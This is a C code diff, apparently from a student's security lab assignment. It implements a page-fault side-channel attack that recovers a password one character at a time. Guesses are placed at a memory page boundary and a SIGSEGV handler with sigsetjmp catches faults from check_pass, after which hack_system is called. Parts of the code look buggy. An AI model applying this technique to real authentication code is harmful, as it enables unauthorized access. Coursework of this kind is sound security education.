@@ -25,9 +25,7 @@ void handle_SEGV(int sig_num) {
 // function in your solution, but it should serve as an example of how you
 // _will_ need to use signals to complete this assignment.
 //
-int demonstrate_signals(char * guess, int len) {
-    char *page = page_start-len;
-    memcpy(page, &guess, len);
+int demonstrate_signals() {
     
     // this call arranges that _if_ there is a SEGV fault in the future
     // (anywhere in the program) then control will transfer directly to this
@@ -35,7 +33,6 @@ int demonstrate_signals(char * guess, int len) {
     if (sigsetjmp(jumpout, 1) == 1)
         return 1; // we had a SEGV
 
-    signal(SIGSEGV, SIG_DFL);
     signal(SIGSEGV, &handle_SEGV);
 
 }
@@ -101,20 +98,30 @@ int main(int argc, char **argv) {
     //   password, each time trying all possible characters
     //
 
-    for (int i =0; i<32; i++) {
-        for (char k=0; 32<k<127; k++) {
-            guess[32-i] = k;
-            if (demonstrate_signals(guess, len+1) == 1) {
-                printf("%c\n", k);
-            }
-            check_pass(guess);
-        }
-    }
 
-    if (check_pass(guess)) {
-        printf("Password Found!\n");
-        hack_system(guess);
+    for (int i=0; i < 32; i++) {
+
+    for (char k=33; k<127; k++) {
+	guess[i] = k;
+	char * page = page_start - i - 1;
+	memcpy(page, &guess, i+1);
+	
+	if (sigsetjmp(jumpout, 1) == 1) {
+	    guess[i+1] = '\0';
+	    if (check_pass(guess) == 1) {
+	    	printf("Password Found!\n");
+		hack_system(guess);
+		return;
+	    }
+	    break;
+	}
+	signal(SIGSEGV, SIG_DFL);
+	signal(SIGSEGV, &handle_SEGV);
+        check_pass(page);
     };
+    };
+
+    
 
     printf("Could not get the password!  Last guess was %s\n", guess);
     return 1;
